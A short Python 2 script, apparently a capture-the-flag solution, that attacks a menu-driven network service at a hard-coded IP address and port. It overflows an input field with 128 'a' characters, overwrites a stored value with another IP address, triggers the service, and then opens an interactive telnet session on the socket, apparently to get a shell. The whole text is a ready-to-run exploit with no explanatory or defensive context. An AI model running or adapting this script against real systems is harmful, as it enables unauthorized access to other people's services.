import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '52.0.164.37'
port = 8888

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

readuntil(f, '[m]# ')
f.write('d\n')

readuntil(f, '[d]# ')
f.write('f\n')

readuntil(f, 'condition: ')
f.write('a' * 128 + '\n')

readuntil(f, '[d]$ ')
f.write('m\n')

readuntil(f, '[m]$ ')
f.write('c\n')

readuntil(f, '[c]$ ')
f.write('n\n')

readuntil(f, 'New Value: ')
f.write('202.120.7.113\n')

readuntil(f, '[c]$ ')
f.write('m\n')

readuntil(f, '[m]$ ')
f.write('d\n')

readuntil(f, '[d]$ ')
f.write('r\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
